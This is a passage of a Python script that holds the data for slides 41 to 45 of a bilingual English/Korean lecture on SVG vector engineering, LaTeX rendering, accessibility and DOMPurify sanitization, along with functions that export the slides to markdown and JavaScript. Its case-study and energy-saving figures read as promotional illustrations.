            "Step 2: Semantic Vector Synthesis (Generate structured XML `<svg>` with Bezier paths and `<g>` layers).",
            "Step 3: Precision Sanitation (Run SVGO pipeline to round coordinates to 1 decimal and prune bloat).",
            "Step 4: Theming & DOM Binding (Bind `currentColor` and CSS custom variables for instant dark mode).",
            "Step 5: Accessibility & XSS Hardening (Inject `<title>`, `<desc>`, ARIA labels, and sanitize via DOMPurify).",
            "Step 6: Production Verification (Verify 0ms CLS layout shift, sign Ed25519 receipt, and deploy)."
        ],
        "script": (
            "[TA Sarah] Slide 41 presents our master engineering methodology: \"THE 6-STEP CALCULATED ART BLUEPRINT.\"\n\n"
            "[TA James] Follow this exact 6-step pipeline in your visual development: Step 1: Ingest visual sketch. Step 2: Synthesize semantic SVG. Step 3: Run SVGO coordinate sanitation. Step 4: Bind CSS dark mode variables! Step 5: Inject WCAG accessibility and DOMPurify XSS defenses! Step 6: Verify 0ms layout shift and deploy!\n\n"
            "[Prof. Peter] This structured 6-step blueprint guarantees sub-kilobyte payload, infinite sharpness, and total accessibility.\n\n"
            "[TA Sarah] Let us inspect our Pre-Deployment Production Checklist on Slide 42."
        ),
        "koreanGuide": {
            "summary": "계산된 예술(Calculated Art) 6단계 표준 구현 청사진",
            "points": [
                "1단계: 시각 에셋 수용 (화이트보드 스케치, CAD 파일, LaTeX 수식 문자열)",
                "2단계: 시맨틱 벡터 합성 (베지에 패스와 <g> 레이어가 포함된 구조화된 SVG 생성)",
                "3단계: 정밀 살균 (SVGO 파이프라인으로 소수점 1자리 축소 및 찌꺼기 제거)",
                "4단계: 테마 바인딩 (currentColor 및 CSS 변수로 다크모드 즉각 지원)",
                "5단계: 접근성 및 보안 하드닝 (<title>, <desc>, ARIA 라벨 주입 및 DOMPurify 살균)",
                "6단계: 프로덕션 검증 (0ms CLS 확인, Ed25519 전자서명 날인 및 배포)"
            ],
            "tips": "제임스 조교가 6단계 절차를 완벽한 프론트엔드 비주얼 배포 지침으로 일목요연하게 정리합니다."
        },
        "keyTerms": [
            {
                "term": "Calculated Art Blueprint",
                "def": "The formal 6-stage engineering process governing vector generation, optimization, accessibility, and security.",
                "defKo": "계산된 예술 배포 표준 청사진"
            },
            {
                "term": "Production Vector Pipeline",
                "def": "An automated asset build system ensuring all shipped graphics are minified, accessible, and secure.",
                "defKo": "프로덕션 벡터 파이프라인"
            }
        ]
    },
    # Slide 42: Production Checklist: Pre-Deployment Verification
    {
        "num": 42,
        "type": "content",
        "title": "PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION",
        "subtitle": "The 6-gate audit every SVG and LaTeX asset must pass before production deployment",
        "points": [
            "Gate 1: Asset payload strictly under 5 Kilobytes (zero bloated base64 bitmap raster embeds).",
            "Gate 2: Responsive `viewBox` attribute validated on mobile, tablet, and 4K viewports.",
            "Gate 3: Dark Mode and Light Mode theme switching verified with zero duplicate files.",
            "Gate 4: WCAG 2.1 AAA accessibility confirmed with semantic `<title>` and 7:1 color contrast.",
            "Gate 5: DOMPurify XSS sanitation audit passed with zero executable script tags.",
            "Gate 6: Zero Cumulative Layout Shift (CLS = 0.00) verified during initial page load."
        ],
        "script": (
            "[TA James] Slide 42 presents our \"PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION.\"\n\n"
            "[TA Sarah] Before shipping any visual or mathematical asset to production, audit all 6 gates: Gate 1: Under 5KB payload. Gate 2: Valid responsive `viewBox`. Gate 3: Instant Dark Mode switching. Gate 4: WCAG AAA accessibility. Gate 5: DOMPurify XSS audit passed. Gate 6: Zero Cumulative Layout Shift (CLS = 0.00)!\n\n"
            "[Prof. Peter] Strict verification gates ensure that your web applications remain razor-sharp, blazing fast, and impenetrable.\n\n"
            "[TA Sarah] Let us inspect Green Sustainable IT on Slide 43!"
        ),
        "koreanGuide": {
            "summary": "프로덕션 체크리스트: SVG 및 LaTeX 배포 전 6대 검증 관문",
            "points": [
                "1관문: 에셋 용량 5KB 미만 엄격 준수 (임베디드 base64 비트맵 찌꺼기 0건)",
                "2관문: 모바일, 태블릿, 4K 화면에서의 반응형 viewBox 자동 조절 검증",
                "3관문: 단일 파일 기반 0ms 라이트/다크모드 동적 테마 전환 확인",
                "4관문: 시맨틱 <title> 및 7:1 명도 대비 WCAG AAA 접근성 충족",
                "5관문: DOMPurify XSS 보안 살균 감사 100% 통과",
                "6관문: 초기 로딩 시 레이아웃 흔들림 제로 (CLS = 0.00) 실증"
            ],
            "tips": "제임스 조교가 6대 검증 관문을 단호하게 체크리스트로 확인합니다."
        },
        "keyTerms": [
            {
                "term": "Pre-Deployment Visual Gate",
                "def": "A mandatory quality assurance gate auditing vector payload size, accessibility compliance, and security.",
                "defKo": "시각 자산 배포 전 검증 관문"
            },
            {
                "term": "Zero Base64 Embed Invariant",
                "def": "The strict architectural policy forbidding heavy raster bitmaps from being covertly embedded inside SVG files.",
                "defKo": "Base64 비트맵 은닉 금지 불변식"
            }
        ]
    },
    # Slide 43: Green Sustainable IT: Power Savings of Vectors
    {
        "num": 43,
        "type": "content",
        "title": "GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS",
        "subtitle": "How sub-kilobyte mathematical vectors slash global data center energy and battery drain",
        "points": [
            "The Global Data Tax: Serving billions of 5MB raster images consumes millions of megawatt-hours of data center cooling.",
            "The 99% Energy Collapse: Serving 500-byte SVGs slashes edge router transmission energy by 99%.",
            "OLED Dark Mode Savings: Black vector backgrounds turn off OLED pixels completely, extending mobile battery life by 35%."
        ],
        "script": (
            "[Prof. Peter] Slide 43 highlights \"GREEN SUSTAINABLE IT: THE POWER SAVINGS OF VECTORS.\"\n\n"
            "[TA Sarah] Serving billions of heavy 5-megabyte raster images across global fiber networks burns millions of kilowatt-hours in data center cooling and mobile battery drain!\n\n"
            "[TA James] When you replace bloated PNGs with 500-byte SVGs, edge transmission energy collapses by 99%! And with Dark Mode vector styling, OLED screens turn off black pixels completely, extending smartphone battery life by 35%!\n\n"
            "[Prof. Peter] True engineering wisdom cares for the ecological health of God's creation.\n\n"
            "[TA Sarah] Let us inspect our capstone enterprise case study on Slide 44!"
        ),
        "koreanGuide": {
            "summary": "그린 지속 가능한 IT: 초경량 벡터가 가져오는 전 세계 데이터센터 전력 절감",
            "points": [
                "글로벌 데이터 세금: 수십억 장의 5MB 비트맵 전송이 유발하는 데이터센터 냉각 전력 낭비",
                "99% 전송 에너지 절감: 500바이트 초경량 SVG로 대체 시 엣지 라우터 통신 전력 99% 급감",
                "OLED 다크모드 배터리 절감: 검은색 벡터 영역의 OLED 소자를 완전 소등하여 모바일 배터리 35% 연장"
            ],
            "tips": "사라 조교와 제임스 조교가 초경량 벡터가 실현하는 탄소 절감과 OLED 배터리 연장의 기적을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Green Vector IT",
                "def": "Minimizing internet electrical energy consumption and carbon footprint by deploying lightweight vector assets.",
                "defKo": "친환경 그린 벡터 IT"
            },
            {
                "term": "OLED Pixel Power Efficiency",
                "def": "The electrical energy savings achieved by displaying pure black vector backgrounds on active-matrix OLED displays.",
                "defKo": "OLED 소등 기반 전력 효율"
            }
        ]
    },
    # Slide 44: Case Study 5: 30X Bandwidth Compression & Crisp Visual ROI
    {
        "num": 44,
        "type": "casestudy",
        "title": "CASE STUDY 5: 30X BANDWIDTH COMPRESSION ROI",
        "subtitle": "Global FinTech Mega-App replaces 25,000 raster charts with reactive SVG engine across 50M mobile users",
        "company": "Top Global Mobile FinTech & Banking Mega-App",
        "problem": "50 million active mobile users loaded bloated raster portfolio charts; mobile data transfer bills cost $3.8M annually, and charts blurred on new 4K foldable phones.",
        "solution": "Deployed complete 6-step Calculated Art blueprint: replaced all chart PNGs with parametric SVG paths and pre-rendered LaTeX financial formulas.",
        "impact": "30X measured bandwidth compression; average app load time slashed from 3.2s to 0.3s; saved $3.6M in annual CDN egress; user CSAT rating jumped to 4.9/5.0.",
        "script": (
            "[Prof. Peter] Slide 44 presents our capstone enterprise case study: \"CASE STUDY 5: 30X BANDWIDTH COMPRESSION & CRISP VISUAL ROI BLUEPRINT.\"\n\n"
            "[TA Sarah] A global mobile banking app serving 50 million users was suffocating under heavy raster chart images! Every time a user opened their stock portfolio, the app downloaded 12 PNG charts, costing the bank 3.8 million dollars a year in AWS CDN bandwidth bills while blurring on foldable phones!\n\n"
            "[TA James] They deployed our complete 6-step Calculated Art blueprint: converting all portfolio charts into parametric SVG vectors and pre-rendering financial calculus into crisp mathematical SVGs!\n\n"
            "[Prof. Peter] Look at the enterprise numbers: measured network bandwidth dropped by 30X! App launch time plunged from 3.2s down to 0.3s! The bank saved 3.6 million dollars in annual CDN bills, and user satisfaction surged to a record 4.9 out of 5.0!\n\n"
            "[TA Sarah] That is the ultimate enterprise transformation.\n\n"
            "[TA James] Now let us build your own Reactive SVG Dashboard in Lab 13 on Slide 45!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 5: 5,000만 사용자 핀테크 앱의 30배 대역폭 압축 및 연간 360만 달러 절감",
            "points": [
                "문제 상황: 5,000만 사용자가 포트폴리오 차트를 열 때마다 12개 PNG를 다운로드하여 연 380만 달러 CDN 요금 청구",
                "솔루션: 6단계 Calculated Art 청사진 전사 도입 ➔ 매개변수형 SVG 차트 및 사전 렌더링 LaTeX 수식으로 전면 전환",
                "성과: 대역폭 30배 압축, 앱 로딩 3.2초 ➔ 0.3초 단축, 연간 360만 달러 CDN 비용 절감, 앱 평점 4.9/5.0 달성"
            ],
            "tips": "사라 조교와 제임스 조교가 360만 달러 절감과 0.3초 로딩의 압도적 성과를 전하며 실습으로 유도합니다."
        },
        "keyTerms": [
            {
                "term": "30X Bandwidth Compression",
                "def": "The dramatic reduction in digital transmission volume achieved across large mobile application user bases.",
                "defKo": "30배 대역폭 압축 승수"
            },
            {
                "term": "Sub-Second Mobile App Launch",
                "def": "Achieving instantaneous mobile application startup by replacing heavy image payloads with lightweight vector code.",
                "defKo": "서브초 모바일 앱 기동"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 45: Hands-on Lab 13 & Conclusion
    {
        "num": 45,
        "type": "lab",
        "title": "🛠️ HANDS-ON LAB 13 & CONCLUSION",
        "subtitle": "Building a Reactive Mathematical SVG & LaTeX Visualization Engine",
        "mission": "Construct a responsive SVG financial dashboard with dynamic Bezier curves, bind CSS variables for instant Dark Mode theming, integrate pre-rendered LaTeX mathematical formulas, and audit security with DOMPurify sanitization.",
        "steps": [
            "Step 1: Write an inline semantic SVG containing a responsive `viewBox='0 0 800 400'` and `<path>` Bezier curves.",
            "Step 2: Bind `stroke='currentColor'` and CSS variables (`var(--accent)`) to support instant Dark Mode toggling.",
            "Step 3: Add a stroke-dasharray animation to animate chart lines drawing themselves in 1 second.",
            "Step 4: Pre-render a complex financial differential equation ($\frac{\partial V}{\partial t} + \frac{1}{2}\sigma^2 S^2 \frac{\partial^2 V}{\partial S^2} + rS \frac{\partial V}{\partial S} - rV = 0$) into pure SVG.",
            "Step 5: Run DOMPurify sanitization, verify zero layout shift (CLS = 0.00), and export your completed dashboard package!"
        ],
        "script": (
            "[TA Sarah] Here we are at Slide 45: \"🛠️ HANDS-ON LAB 13 & SESSION CONCLUSION!\"\n\n"
            "[TA James] Tonight's hands-on lab turns you into a Vector Visual Master! Step 1: Write your responsive SVG with Bezier curves. Step 2: Bind CSS variables for instant Dark Mode. Step 3: Add a line-drawing stroke animation! Step 4: Pre-render the Black-Scholes financial differential equation into crisp SVG! Step 5: Run DOMPurify sanitization, verify zero layout shift, and export your production dashboard!\n\n"
            "[Prof. Peter] Once you master Calculated Vectors and LaTeX, your applications will possess infinite clarity, blazing speed, and timeless mathematical elegance.\n\n"
            "[TA Sarah] In our next session, Session 14, we enter the director's chair: Google Flow AI vs. Runway Gen-3 Cinematic Production!\n\n"
            "[Prof. Peter] On behalf of TA Sarah Jenkins, TA James Wilson, and the entire Smart Insight Lab, congratulations on mastering Session 13! Soli Deo Gloria, and we will see you in Session 14!"
        ),
        "koreanGuide": {
            "summary": "실습 과제 13 및 세션 마무리: 반응형 수학 SVG 및 LaTeX 시각화 엔진 제작",
            "points": [
                "실습 미션: 반응형 viewBox와 베지에 곡선을 갖춘 인라인 SVG 금융 대시보드 작성",
                "CSS 변수 기반 다크모드 지원 및 1초 스트로크 드로잉 애니메이션 적용",
                "블랙-숄즈 편미분 방정식의 사전 렌더링 SVG 삽입, DOMPurify 보안 살균 및 CLS 0.00 검증"
            ],
            "tips": "3인의 강사진이 오늘 수업의 성취를 축하하고 다음 세션(Session 14: Google Flow AI vs Runway)에 대한 기대감을 높이며 마무리합니다."
        },
        "keyTerms": [
            {
                "term": "Hands-on Milestone",
                "def": "The practical engineering completion of a functioning technical artifact fulfilling the session's learning objectives.",
                "defKo": "실습 달성 마일스톤"
            },
            {
                "term": "Calculated Vector Master Certification",
                "def": "The formal mastery of semantic SVG markup, responsive Bezier curve mathematics, and secure LaTeX typography.",
                "defKo": "계산된 벡터 마스터 인증"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    }
]

def generate_session13_md(slides):
    lines = []
    lines.append("# Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration")
    lines.append("**Course:** The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom  ")
    lines.append("**Instructors:** Professor Peter Kim (Director), TA Sarah Jenkins (Senior AI Fellow) & TA James Wilson (DevOps TA) • Oikos University (www.oikos.edu)  ")
    lines.append("**Lecture Format:** Full 75-Minute Broadcast Trio Master Dialogue (4x Modules with 5 Enterprise Case Studies)  ")
    lines.append("**Total Slides:** 45 Slides (Expanded Multi-Presenter Master Edition)  ")
    lines.append("**Motto:** Soli Deo Gloria  ")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("## 📌 Table of Contents (목차)")
    
    for s in slides:
        num_str = f"{s['num']:02d}"
        title = s['title']
        slug = f"slide-{num_str}-{title.lower().replace(' ', '-').replace(':', '').replace('.', '').replace('&', 'and').replace('(', '').replace(')', '').replace('•', '').replace('\'', '').replace('’', '').replace('/', '-')}"
        slug = re.sub(r'-+', '-', slug).strip('-')
        lines.append(f"- [Slide {num_str}: {title}](#{slug})")
        
    lines.append("")
    lines.append("---")
    lines.append("")
    
    for s in slides:
        num_str = f"{s['num']:02d}"
        lines.append(f"## Slide {num_str}: {s['title']}")
        if s.get('subtitle'):
            lines.append(f"**Subtitle:** {s['subtitle']}")
        lines.append(f"**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab")
        lines.append("")
        
        lines.append("### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)")
        lines.append(s['script'])
        lines.append("")
        
        lines.append("### 🇰🇷 한국어 강의 가이드 및 핵심 요약")
        kg = s['koreanGuide']
        lines.append(f"**개요 요약:** {kg['summary']}")
        lines.append("")
        lines.append("**핵심 티칭 포인트:**")
        for pt in kg.get('points', []):
            lines.append(f"- {pt}")
        lines.append("")
        lines.append(f"**강의 전달 팁:** {kg.get('tips', '')}")
        lines.append("")
        
        if s.get('keyTerms'):
            lines.append("### 📚 Key Technical Terms (핵심 용어)")
            for kt in s['keyTerms']:
                lines.append(f"- **{kt['term']}** ({kt['defKo']}): {kt['def']}")
            lines.append("")
            
        lines.append("---")
        lines.append("")
        
    return "\n".join(lines)

def update_slides_data_js(slides):
    with open(SLIDES_DATA_JS, 'r', encoding='utf-8') as f:
        content = f.read()

    slides_json = json.dumps(slides, ensure_ascii=False, indent=2)
    new_export = f"export const SLIDES_SESSION_13 = {slides_json};"
    
    pattern = r"export\s+const\s+SLIDES_SESSION_13\s*=\s*\[[\s\S]*?\];"
    if re.search(pattern, content):
        updated_content = re.sub(pattern, lambda m: new_export, content, count=1)
        with open(SLIDES_DATA_JS, 'w', encoding='utf-8') as f:
            f.write(updated_content)
        print("Successfully updated SLIDES_SESSION_13 in slidesData.js!")
    else:
        print("Could not find SLIDES_SESSION_13 pattern in slidesData.js!")

def main():
    print(f"Total slides configured: {len(SLIDES_45_SESSION_13)}")
    
    # Verify part dividers
    part_slides = [s for s in SLIDES_45_SESSION_13 if s['type'] == 'section']
    print(f"Total PART Section Slides: {len(part_slides)}")
    for ps in part_slides:
        print(f"  Slide {ps['num']:02d}: {ps['title']}")
        
    # Verify case studies
    case_slides = [s for s in SLIDES_45_SESSION_13 if 'CASE STUDY' in s['title']]
    print(f"Total Case Study Slides: {len(case_slides)}")
    for cs in case_slides:
        print(f"  Slide {cs['num']:02d}: {cs['title']}")

    # 1. Write session13.md
    session13_md_content = generate_session13_md(SLIDES_45_SESSION_13)
    with open(SESSION13_MD, 'w', encoding='utf-8') as f:
        f.write(session13_md_content)
    print(f"Successfully generated and saved {SESSION13_MD} ({len(session13_md_content)} bytes)")
    
    # 2. Update slidesData.js
    update_slides_data_js(SLIDES_45_SESSION_13)
    
    print("Session 13 generation completed successfully!")

if __name__ == '__main__':
    main()
